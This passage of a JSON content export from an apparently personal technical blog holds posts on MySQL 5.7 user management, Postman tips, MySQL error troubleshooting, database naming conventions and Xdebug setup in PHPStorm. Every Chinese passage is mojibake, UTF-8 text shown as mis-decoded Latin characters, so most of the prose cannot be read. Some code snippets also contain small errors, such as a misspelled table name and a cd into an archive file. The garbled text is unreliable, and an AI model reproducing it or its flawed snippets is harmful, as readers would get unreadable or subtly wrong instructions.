","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"å±€åŸŸç½‘","slug":"å±€åŸŸç½‘","permalink":"https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"mysql5.7ç”¨æˆ·ç®¡ç†ï¼šæ·»åŠ ç”¨æˆ·ã€æˆæƒã€æ’¤æƒã€ä¿®æ”¹å¯†ç ","slug":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords","date":"2020-09-20T15:42:13.000Z","updated":"2020-09-20T15:43:47.158Z","comments":true,"path":"mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","link":"","permalink":"https://www.0x2beace.com/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/","excerpt":"å› ä¸ºMysql 5.7 æ˜¯ç›®å‰ä½¿ç”¨æœ€å¤šçš„æ•°æ®åº“ï¼Œè€Œ5.7 åœ¨æŸäº›åœ°æ–¹åˆå’Œå…¶ä»–ç‰ˆæœ¬æœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹ã€‚","text":"å› ä¸ºMysql 5.7 æ˜¯ç›®å‰ä½¿ç”¨æœ€å¤šçš„æ•°æ®åº“ï¼Œè€Œ5.7 åœ¨æŸäº›åœ°æ–¹åˆå’Œå…¶ä»–ç‰ˆæœ¬æœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹ã€‚ åˆ›å»ºç”¨æˆ·123# è¯­æ³•ï¼šCREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;mysql&gt; CREATE USER &#39;boo&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;122410&#39;; host å‚æ•°è¯´æ˜ï¼š %ï¼šåŒ¹é…æ‰€æœ‰ä¸»æœº localhostï¼šå½“å‰ä¸»æœºï¼Œlocalhost ä¸ä¼šè¢«è§£ææˆIPåœ°å€ï¼Œè€Œæ˜¯é€šè¿‡UNIXsocket è¿æ¥ 127.0.0.1ï¼šå½“å‰ä¸»æœºï¼Œé€šè¿‡TCP/IP åè®®è¿æ¥ ::1ï¼šå½“å‰ä¸»æœºï¼Œå…¼å®¹æ”¯æŒipv6 æ­¤æ—¶è¿˜æ²¡æœ‰æˆæƒï¼Œåªèƒ½ç™»é™†ï¼Œæ— æ³•åšå…¶ä½™æ“ä½œ ç”¨æˆ·æˆæƒ1234567891011121314# åˆ›å»ºå®Œæˆä¹‹åæˆæƒmysql&gt; grant all privileges ON &#96;dbName&#96;.* TO &#39;username&#39;@&#39;host&#39;;# åˆ›å»ºç”¨æˆ·åŒæ—¶æˆæƒmysql&gt; grant all privileges on dbName.* to &#39;username&#39;@&#39;host&#39; identified by &#39;password&#39;;# åˆ·æ–°æƒé™mysql&gt; flush privileges;# æŸ¥çœ‹ç”¨æˆ·æ‰€æœ‰æƒé™mysql&gt; show grants for dev@&#39;%&#39;;# æ’¤æ¶ˆç”¨æˆ·æˆæƒï¼Œæ’¤æ¶ˆè¦æ±‚å„å‚æ•°ä¸æˆæƒæ—¶ä½¿ç”¨çš„ä¸€è‡´ï¼Œå¯ä»¥å…ˆæŸ¥çœ‹æˆæƒå†æ’¤æ¶ˆmysql&gt; revoke privileges ON dbName.* FROM &#39;username&#39;@&#39;host&#39;; privileges å‚æ•°è¯´æ˜ï¼š all privileges: æ‰€æœ‰æƒé™ï¼› select: æŸ¥è¯¢ï¼› insert: æ–°å¢è®°å½•; update: æ›´æ–°è®°å½•ï¼› delete: åˆ é™¤è®°å½•ï¼› create: åˆ›å»ºè¡¨ï¼› drop: åˆ é™¤è¡¨ï¼› alter: ä¿®æ”¹è¡¨ç»“æ„ï¼› index: ç´¢å¼•ç›¸å…³æƒé™ï¼› execute: æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ä¸callå‡½æ•° referencesï¼š å¤–é”®ç›¸å…³ï¼› create temporary tablesï¼šåˆ›å»ºä¸´æ—¶è¡¨ï¼› lock tablesï¼šé”è¡¨ï¼› create viewï¼šåˆ›å»ºè§†å›¾ï¼› show viewï¼šæŸ¥çœ‹è§†å›¾ç»“æ„ï¼› trigger: è§¦å‘å™¨ï¼› dbName å¯ä»¥æ˜¯æŸä¸ªåº“ï¼ˆdatabaseï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯å…·ä½“åˆ°æŸå¼ è¡¨ï¼ˆdatabase.tableï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯æ‰€æ•´ä¸ªæ•°æ®åº“ï¼ˆ*ï¼‰ã€‚ ä¿®æ”¹å¯†ç 1234567891011121314# ä¿®æ”¹è‡ªå·±çš„å¯†ç mysql&gt; set password&#x3D;password(&#39;newpassword&#39;);# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•1mysql&gt; set password for &#39;username&#39;@&#39;host&#39; &#x3D; password(&#39;newpassword&#39;);# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•2: é€‚ç”¨mysql5.7ä»¥å‰çš„ç‰ˆæœ¬ï¼Œ5.7ä»¥åçš„ç‰ˆæœ¬ä¸­mysql.userè¡¨æ²¡æœ‰äº†passwordå­—æ®µmysql&gt; update mysq.user set password&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;user&#39; and host&#x3D;&#39;host&#39;;# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•3ï¼šé€‚ç”¨mysql5.7mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;root&#39;;# ä¿®æ”¹åˆ«äººå¯†ç â€”â€”æ–¹æ³•4mysql&gt; alter user &#39;test&#39;@&#39;%&#39; identified by &#39;newpassword&#39;; åˆ é™¤ç”¨æˆ·1mysql&gt; DROP USER &#39;username&#39;@&#39;host&#39;; ä¸å»ºè®®ç›´æ¥é€šè¿‡ä¿®æ”¹mysql.userè¡¨å»æ“ä½œç”¨æˆ·ã€‚ å‚è€ƒé“¾æ¥ mysql5.7ç”¨æˆ·ç®¡ç†ï¼šæ·»åŠ ç”¨æˆ·ã€æˆæƒã€æ’¤æƒã€ä¿®æ”¹å¯†ç ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Postman ä½¿ç”¨æŠ€å·§æ•´ç†","slug":"postman-tips","date":"2020-09-19T12:58:16.000Z","updated":"2020-10-30T00:22:26.807Z","comments":true,"path":"postman-tips/","link":"","permalink":"https://www.0x2beace.com/postman-tips/","excerpt":"Postman ä½œä¸ºhttp è¯·æ±‚å·¥å…·ï¼Œæ— è®ºæ˜¯å¼€å‘è¿˜æ˜¯æµ‹è¯•æ‰€ä½¿ç”¨çš„é¢‘ç‡è¿˜æ˜¯æŒºé«˜çš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„ä½¿ç”¨æŠ€å·§ã€‚","text":"Postman ä½œä¸ºhttp è¯·æ±‚å·¥å…·ï¼Œæ— è®ºæ˜¯å¼€å‘è¿˜æ˜¯æµ‹è¯•æ‰€ä½¿ç”¨çš„é¢‘ç‡è¿˜æ˜¯æŒºé«˜çš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„ä½¿ç”¨æŠ€å·§ã€‚ å‘é€è¡¨å•æäº¤è¿™é‡Œçš„è¡¨å•æäº¤å°±æ˜¯æŒ‡ä¼ ç»Ÿçš„è¡¨å•æäº¤ã€‚ æ ¸å¿ƒè¯·æ±‚å¤´ä¿¡æ¯ï¼š 12Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;Content-Type: application&#x2F;x-www-form-urlencoded body çš„æ•°æ®æ ¼å¼é€‰æ‹©form-dataã€‚ å‘é€Ajax è¯·æ±‚æ ¸å¿ƒè¯·æ±‚å¤´ä¿¡æ¯ï¼š 123Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*;Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8X-Requested-With: XMLHttpRequest body çš„æ•°æ®æ ¼å¼é€‰æ‹© x-www-form-urlencodeï¼Œå¦‚æœé€‰æ‹©form-dataåˆ™æ¥æ”¶åˆ°çš„æ•°æ®æ ¼å¼ä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼š å¦‚æœä»¥x-www-form-urlencodeæ ¼å¼è¿›è¡Œæäº¤ï¼Œé‚£ä¹ˆæ¥æ”¶åˆ°çš„æ•°æ®æ˜¯è¿™ä¸ªæ ·å­ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡é­”æœ¯å˜é‡è·å–ä½¿ç”¨ã€‚ å¦‚ä½•æŠŠè¯·æ±‚å‚æ•°ä½œä¸ºjson æ ¼å¼è¿›è¡Œæäº¤ï¼Ÿåœ¨Bodyä¸­ï¼Œé€‰æ‹©raw ç„¶åæŠŠè¯·æ±‚å‚æ•°ä»¥json çš„æ ¼å¼å¡«è¿›å»ã€‚ ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œä»¥json æ ¼å¼æäº¤çš„è¯·æ±‚ï¼Œç”¨å¸¸è§çš„é­”æœ¯å˜é‡è·å–ä¸åˆ°ï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ï¼š 1json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)); æäº¤æ–‡ä»¶æœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¯ä»¥æµ‹è¯•æ–‡ä»¶æäº¤ï¼Œä½¿ç”¨ Postman å½“ç„¶ä¹Ÿå¯ä»¥å®Œæˆã€‚ è¯·æ±‚æ–¹å¼é€‰æ‹©POSTï¼ŒHeaders å¯ä»¥ä¸ç”¨åšé€‰æ‹©ï¼ŒBody é€‰æ‹© form-dataï¼Œç±»å‹ç”±é»˜è®¤çš„text æ”¹æˆ fileï¼Œç„¶åé€‰æ‹©éœ€è¦æäº¤çš„æ–‡ä»¶å³å¯ã€‚ æ³¨æ„ï¼škey æœ€å¥½ä¹Ÿå¡«ä¸Š file è¿™ä¸ªå…³é”®å­—ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Postman","slug":"Postman","permalink":"https://www.0x2beace.com/tags/Postman/"},{"name":"JSON","slug":"JSON","permalink":"https://www.0x2beace.com/tags/JSON/"}]},{"title":"Mysql å¸¸è§å¼‚å¸¸åˆ†æ","slug":"mysql-common-exception-analysis","date":"2020-09-17T12:52:29.000Z","updated":"2020-09-17T12:57:42.663Z","comments":true,"path":"mysql-common-exception-analysis/","link":"","permalink":"https://www.0x2beace.com/mysql-common-exception-analysis/","excerpt":"æœ¬æ–‡ç”¨æ¥æ•´ç† Mysql ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚","text":"æœ¬æ–‡ç”¨æ¥æ•´ç† Mysql ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚ Mysql æ— æ³•æ­£å¸¸å¯åŠ¨å¼‚å¸¸æè¿°ï¼šMysql Server æ— æ³•æ­£å¸¸å¯åŠ¨ï¼ŒClient è¿æ¥Mysql å¼‚å¸¸å¦‚ä¸‹ï¼š ERROR 2002 (HY000): Canâ€™t connect to local MySQL server through socket â€˜/var/run/mysqld/mysqld.sockâ€™ (2) é¦–å…ˆï¼Œè¿™ä¸ªé”™è¯¯æ„å‘³ç€ /var/run/mysqld/mysqld.sock ä¸å­˜åœ¨ï¼Œè€Œè¯¥æ–‡ä»¶ä¹‹æ‰€ä»¥ä¸å­˜åœ¨ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ²¡æœ‰å®‰è£… mysql-serverï¼Œä¹Ÿå¯èƒ½æ˜¯å› ä¸ºè¯¥æ–‡ä»¶è¢«ç§»åŠ¨äº†ã€‚ å¦‚æœæ˜¯éœ€è¦è¿æ¥æœ¬æœºçš„Mysqlï¼ˆmysql -hlocalhost -uroot -pï¼‰ï¼Œé‚£ä¹ˆéœ€è¦å…ˆå®‰è£… mysql serverï¼š 1apt-get install mysql-server -y å¦‚æœMysql æœåŠ¡ç¡®å®æœ‰åœ¨æœ¬åœ°è¿è¡Œï¼Œé‚£ä¹ˆè¯·æ£€æŸ¥/etc/mysql/mysql.conf.d/mysqld.cnf é…ç½®æ–‡ä»¶ï¼Œæ˜¯å¦å­˜åœ¨ä»¥ä¸‹é…ç½®ï¼š 1socket &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock å¦‚æœåªæ˜¯éœ€è¦è¿æ¥å…¶ä»–ä¸»æœºï¼Œé‚£ä¹ˆåœ¨æœ¬æœºä¸Šä¸å®‰è£… Mysql Server ä¹Ÿå¯ä»¥ï¼Œä½†éœ€è¦ä¿è¯â€œå…¶ä»–ä¸»æœºâ€çš„Mysql å·²ç»æ­£å¸¸å¯åŠ¨ã€‚ 1mysql -h&lt;hostname&gt; -uroot -p æ€»ç»“ï¼šæœ€æœ‰å¯èƒ½çš„æƒ…å†µæ˜¯éœ€è¦è¿æ¥çš„Mysql æœåŠ¡æ ¹æœ¬æ²¡æœ‰å¯åŠ¨ï¼Œè¦ä¹ˆæ²¡æœ‰åœ¨ä¸ä»ç»ˆç«¯è¿è¡ŒMySQLå®¢æˆ·ç«¯çš„ä¸»æœºç›¸åŒçš„ä¸»æœºä¸Šè¿è¡Œï¼Œå°æ¦‚ç‡æ˜¯å› ä¸ºé…ç½®æ–‡ä»¶é”™è¯¯å¯¼è‡´ã€‚ Mysql ç”¨æˆ·éªŒè¯å¤±è´¥å¼‚å¸¸æè¿°ï¼šMysql åˆ›å»ºå®Œè¯¥ç”¨æˆ·ä¹‹åï¼Œèµ‹äºˆæƒé™å¹¶è®¾ç½®å¯†ç ï¼Œä½†æ˜¯æ€»æ˜¯ä¼šæç¤ºå¦‚ä¸‹å¼‚å¸¸ï¼š ERROR 1045 (28000): Access denied for user â€˜zabbixâ€™@â€™172.17.0.1â€™ (using password: YES) å‡ºç°è¯¥å¼‚å¸¸ä¿¡æ¯å¯èƒ½æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š ç”¨æˆ·åå¯†ç é”™è¯¯ è¯¥ç”¨æˆ·æƒé™ä¸è¶³ Mysql æ–­å¼€è¿æ¥å¼‚å¸¸æè¿°ï¼šMysql å¶å°”ä¼šè‡ªå·±æ–­å¼€è¿æ¥ï¼Œç„¶åå¿…é¡»é‡å¯Mysql æœåŠ¡æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚ ERROR 2013 (HY000): Lost connection to MySQL server at â€˜reading initial communication packetâ€™, system error: 102 ç›®å‰å¹¶æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„è§£å†³æ–¹æ¡ˆï¼Œä¸è¿‡èƒ½å¤§è‡´ç¡®å®šä»¥ä¸‹å‡ ä¸ªæ–¹å‘ï¼š åå‘DNS è§£æï¼Œé¿å…ä½¿ç”¨localhost å…è®¸ä½¿ç”¨æ‰€æœ‰è¿æ¥ï¼Ÿ localhost å¯¹åº”socketï¼Ÿ127.0.0.1 å¯¹åº” TCP/IPï¼Ÿ å‚è€ƒé“¾æ¥ é”™è¯¯2002(HY000)ï¼šæ— æ³•é€šè¿‡Socketâ€˜/var/run/mysqld/mysqld.sockâ€™è¿æ¥åˆ°æœ¬åœ°MySQLæœåŠ¡å™¨(2) ERROR 2013 (HY000): Lost connection to MySQL server at â€˜reading authorization packetâ€™, system error: 0","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql æ•°æ®åº“è®¾è®¡è§„èŒƒä¸åŸåˆ™","slug":"mysql-database-design-rules-and-principles","date":"2020-09-16T12:48:21.000Z","updated":"2020-09-16T12:51:01.020Z","comments":true,"path":"mysql-database-design-rules-and-principles/","link":"","permalink":"https://www.0x2beace.com/mysql-database-design-rules-and-principles/","excerpt":"æœ€è¿‘éœ€è¦æ ¹æ®ä¸šåŠ¡éœ€æ±‚é‡æ–°è®¾è®¡ä¸€å¥—å®Œæ•´çš„æ•°æ®åº“ï¼Œè®°å½•ä¸€ä¸‹è§„èŒƒçš„æ•°æ®åº“è®¾è®¡åŸåˆ™ã€‚","text":"æœ€è¿‘éœ€è¦æ ¹æ®ä¸šåŠ¡éœ€æ±‚é‡æ–°è®¾è®¡ä¸€å¥—å®Œæ•´çš„æ•°æ®åº“ï¼Œè®°å½•ä¸€ä¸‹è§„èŒƒçš„æ•°æ®åº“è®¾è®¡åŸåˆ™ã€‚ 1ã€æ•°æ®åº“å‘½åè§„èŒƒ å‘½åç®€æ´æ˜ç¡®ï¼Œå¯ä»¥é‡‡ç”¨å­—æ¯ + æ•°å­—è¿›è¡Œç»„åˆï¼Œå¤šä¸ªå•è¯å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ _ è¿›è¡Œåˆ†å‰²ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæ•°æ®è¡¨å‘½åç”¨å•æ•°ï¼Œå­—æ®µå‘½åä¹Ÿç”¨å•æ•° æ•°æ®åº“é‡Œé¢çš„å¯†ç ä¸€å®šè¦åŠ å¯†ï¼Œä¸èƒ½ä¿å­˜æ˜æ–‡ Mysql å¼•æ“ç±»å‹ç»Ÿä¸€ä½¿ç”¨ InnoDBï¼Œå­—ç¬¦ç¼–ç ç»Ÿä¸€ä½¿ç”¨ UTF-8 2ã€æ•°æ®åº“è¡¨åå‘½åè§„èŒƒ å‘½åç®€æ´æ˜ç¡®ï¼Œå¯ä»¥é‡‡ç”¨å­—æ¯ + æ•°å­—è¿›è¡Œç»„åˆï¼Œå¤šä¸ªå•è¯å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ _ è¿›è¡Œåˆ†å‰²ã€‚ å¯ä»¥åˆç†å¢åŠ è¡¨å‰ç¼€ï¼Œæœ‰æ•ˆåŒºåˆ†ä¸åŒç±»å‹çš„æ•°æ®è¡¨ 3ã€æ•°æ®åº“è¡¨å­—æ®µåå‘½åè§„èŒƒ å‘½åç®€æ´æ˜ç¡®ï¼Œå¤šä¸ªå•è¯ä½¿ç”¨ä¸‹åˆ’çº¿_è¿›è¡Œåˆ†å‰²ï¼ˆç»Ÿä¸€ä½¿ç”¨å°å†™ï¼‰ é¿å…ä½¿ç”¨è‡ªå®šä¹‰ç¼©å†™ï¼Œå¦‚ï¼šdate =&gt; dt è¡¨ä¸è¡¨ä¹‹é—´çš„ç›¸å…³è”å­—æ®µåç§°è¦æ±‚å°½å¯èƒ½çš„ç›¸åŒ æ¯ä¸ªå­—æ®µå°½é‡å¤‡æ³¨å…¶å«ä¹‰ 4ã€æ•°æ®åº“è¡¨å­—æ®µç±»å‹è§„èŒƒ æœ€å¥½ç»™æ¯ä¸ªå­—æ®µä¸€ä¸ªé»˜è®¤å€¼ï¼Œé¿å…ä½¿ç”¨ NULLã€‚å­—ç¬¦å‹é»˜è®¤å€¼ä¸ºä¸€ä¸ªç©ºå­—ç¬¦å€¼ä¸²ï¼Œæ•°å€¼å‹çš„é»˜è®¤å€¼ä¸ºæ•°å€¼0ï¼Œé€»è¾‘å‹çš„é»˜è®¤å€¼ä¸ºæ•°å€¼0 ç”¨å°½é‡å°‘çš„å­˜å‚¨ç©ºé—´æ¥å­˜å‚¨ä¸€ä¸ªå­—æ®µçš„æ•°æ® èƒ½ç”¨ tinyint å°±ä¸ç”¨ intï¼Œèƒ½ç”¨ int å°±ä¸è¦ç”¨ varcharï¼Œèƒ½ç”¨ varchar(16)å°±ä¸è¦ç”¨ varchar(225) boolean ç±»å‹çš„å‘½åç»Ÿä¸€ä½¿ç”¨is_xxxæ ¼å¼ 5ã€æ•°æ®åº“è¡¨ç´¢å¼•è§„èŒƒ ä¸ºæ¯ä¸ªè¡¨åˆ›å»ºä¸€ä¸ªä¸»é”®ç´¢å¼•; ä¸ºæ¯ä¸ªè¡¨åˆ›å»ºåˆç†çš„æ™®é€šç´¢å¼•; ä¸€äº›æ³¨æ„äº‹é¡¹ é¿å…ä½¿ç”¨NULLå­—æ®µ(NULLå­—æ®µå¾ˆéš¾æŸ¥è¯¢ä¼˜åŒ–ã€NULLå­—æ®µçš„ç´¢å¼•éœ€è¦é¢å¤–ç©ºé—´ã€NULLå­—æ®µçš„å¤åˆç´¢å¼•æ— æ•ˆ) é¿å…ä½¿ç”¨ count(*) é¿å…ä½¿ç”¨ select * å‚è€ƒé“¾æ¥ MYSQLæ•°æ®åº“è®¾è®¡è§„èŒƒä¸åŸåˆ™ æ•°æ®åº“è®¾è®¡åŸåˆ™ æ•°æ®åº“è¡¨åå­—æ®µå‘½åè§„èŒƒ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windowsã€Mac ä¸‹ä½¿ç”¨ PHPStorm é…ç½® Xdebugï¼Œå®ç°æ–­ç‚¹è°ƒè¯•","slug":"use-phpstorm-to-configure-xdebug-under-windows-and-mac","date":"2020-09-15T13:15:36.000Z","updated":"2020-09-15T13:21:21.882Z","comments":true,"path":"use-phpstorm-to-configure-xdebug-under-windows-and-mac/","link":"","permalink":"https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/","excerpt":"æ­å»ºè¿‡å¾ˆå¤šæ¬¡å¼€å‘ç¯å¢ƒäº†ï¼Œä½†æ¯æ¬¡åœ¨è°ƒè¯•è¿™ä¸€å—è¿˜æ˜¯ä¼šå¤šå°‘è€—è´¹ä¸€ç‚¹æ—¶é—´ã€‚æ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡å…³äºPHPSTORMè°ƒè¯•çš„ç¬”è®°ã€‚","text":"æ­å»ºè¿‡å¾ˆå¤šæ¬¡å¼€å‘ç¯å¢ƒäº†ï¼Œä½†æ¯æ¬¡åœ¨è°ƒè¯•è¿™ä¸€å—è¿˜æ˜¯ä¼šå¤šå°‘è€—è´¹ä¸€ç‚¹æ—¶é—´ã€‚æ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡å…³äºPHPSTORMè°ƒè¯•çš„ç¬”è®°ã€‚ åœ¨è¿›è¡Œè°ƒè¯•ä¹‹å‰ï¼Œé¦–å…ˆè¦åšçš„æ˜¯ä¸‹è½½å¹¶å®‰è£…Xdebugï¼Œç„¶åæ‰èƒ½åšç›¸åº”çš„é…ç½®ã€‚ ä¸‹è½½Xdebugï¼ˆWindowsï¼‰ xdebugå®˜ç½‘ å¦‚ä½•é€‰æ‹©ç¬¦åˆè‡ªå·±PHPçš„ç‰ˆæœ¬çš„Xdebugï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢è¿™ç§æ–¹æ³•æ¥åˆ¤æ–­ã€‚ ä½¿ç”¨Xdubugå®˜æ–¹æä¾›çš„ä¸€ä¸ªæ£€æµ‹å·¥å…· åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼š 12345678# Mac$ php -i | pbcopy# Linux$ php -i | xsel # Windows$ php -i | clip å°†è¾“å‡ºçš„phpinfoä¿¡æ¯å¡«å…¥ï¼Œç„¶åå°±ä¼šè‡ªåŠ¨æ£€æµ‹è¯¥ç‰ˆæœ¬çš„PHP æ‰€å¯¹åº”çš„Xdebugï¼Œå¦‚ä¸‹å›¾ï¼ˆè¿™é‡Œä»¥Windows ä¸ºä¾‹ï¼‰ï¼š ç‚¹å‡»ä¸‹è½½ç›¸åº”çš„æ–‡ä»¶ã€‚ å®‰è£…å¹¶é…ç½®Xdebug å°†ä¸‹è½½å¥½çš„æ–‡ä»¶æ”¾è¿›æŒ‡å®šç›®å½• ..\\php\\ext\\ é…ç½®php.iniæ–‡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¦æ‰¾åˆ°æ­£ç¡®çš„php.iniæ–‡ä»¶ã€‚å¦‚æœä½ ä¸ç¡®å®šæ˜¯å“ªä¸€ä¸ªï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼š æ‰“å°å‡ºphpinfo()ï¼Œæ‰¾åˆ°å­—æ®µLoaded Configuration Fileæ ¹æ®åé¢çš„è·¯å¾„å»æ‰¾å°±æ²¡é”™äº†ã€‚ æ‰“å¼€æ‰¾åˆ°çš„php.inié…ç½®æ–‡ä»¶ï¼Œåœ¨æœ€åé¢åŠ ä¸Šä»¥ä¸‹ä»£ç ï¼š 12345678# Windows[XDebug]zend_extension &#x3D; &quot;C:\\xampp\\php\\ext\\php_xdebug-2.6.1-7.2-vc15.dll&quot; #è¿™ä¸ªåœ°å€æŒ‡å‘ xdebugæ‰€åœ¨çš„æ–‡ä»¶è·¯å¾„xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTROMxdebug.remote_host &#x3D; localhost å…¶ä¸­ï¼š xdebug.remote.hostå¦‚æœæ˜¯æœ¬åœ°è°ƒè¯•ï¼Œå¡«localhostå°±å¥½ã€‚ xdebug.remote_portä¸ºè°ƒè¯•æ‰€ç›‘å¬çš„ç«¯å£ï¼Œé€šå¸¸é»˜è®¤ä½¿ç”¨ 9001 ï¼Œéœ€è¦å’ŒPHPStorm ä¸­çš„ Debug port ç›¸åŒã€‚ ä¸‹è½½å¹¶å®‰è£…Xdebugï¼ˆMacï¼‰Mac ä¸‹å®‰è£…Xdebugï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ä½¿ç”¨peclå‘½ä»¤ é€šè¿‡æºç ç¼–è¯‘ ä½¿ç”¨ pecl Pecl æ˜¯ PHP çš„åŒ…ç®¡ç†å™¨ã€‚ è¿™é‡Œä»¥PHP5.6ä¸ºä¾‹ï¼Œéœ€è¦å®‰è£…æœ€æ–°2.5.xç‰ˆæœ¬çš„Xdebugï¼Œå› ä¸ºè¿™æ˜¯PHP5.6æä¾›æ”¯æŒçš„æœ€åä¸€ä¸ªç‰ˆæœ¬ã€‚ 1$ pecl install xdebug-2.5.5 æºç ç¼–è¯‘æºç è·å–çš„æ–¹å¼å’Œä¸Šé¢Windows çš„æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œå°†è¾“å‡ºçš„phpinfoç²˜è´´è‡³è¾“å…¥æ¡†ï¼Œç„¶åä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„Xdebugã€‚ 123456$ tar -xvzf xdebug-2.9.4.tgz$ cd xdebug-2.9.4.tgz$ phpize$ .&#x2F;configure$ make$ cp modules&#x2F;xdebug.so &#x2F;usr&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug å¯ç”¨Xdebugæ— è®ºæ˜¯é€šè¿‡å“ªç§æ–¹å¼å®‰è£…ï¼Œåœ¨æ­£å¼ä½¿ç”¨ä¹‹å‰ï¼Œéƒ½éœ€è¦æ‰‹åŠ¨å¯ç”¨è¯¥æ¨¡å—ã€‚ æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬çš„ php.ini æ–‡ä»¶å¹¶ç¼–è¾‘ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­çš„æœ€åéƒ¨åˆ†åŠ ä¸Šä»¥ä¸‹å†…å®¹ï¼š 1234567[XDebug]zend_extension&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug&#x2F;xdebug.so&quot;xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTORMxdebug.remote_host &#x3D; localhost é‡å¯PHPå³å¯ã€‚ å¦‚ä½•æ£€æŸ¥Xdebug æ˜¯å¦å¯ç”¨ï¼Ÿ 12$ php -m | grep xdebugxdebug åœ¨PHPStormä¸­é…ç½®XdebugMac File-&gt;Setting-&gt;PHP-&gt;Debugï¼Œç¡®ä¿PHPStorm å·²ç»æ‰¾åˆ°äº†Xdebugã€‚ åœ¨åˆšæ‰çš„é…ç½®æ²¡é”™çš„å‰æä¸‹ï¼Œè¿™é‡Œæ˜¯å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå®‰è£…äº†Xdebugçš„ã€‚ å¦‚æœæ˜¾ç¤ºæ²¡æœ‰å®‰è£…ï¼Œè¯·æ£€æŸ¥ä¸Šé¢ä¸¤æ­¥æ“ä½œæœ‰æ— é—®é¢˜ã€‚ File-&gt;Setting-&gt;PHP-&gt;Debug Debug port ä¸php.inié…ç½®æ–‡ä»¶ä¸­çš„xdebug.remote_portçš„å¯¹åº”å‚æ•°ä¿æŒä¸€è‡´ã€‚ 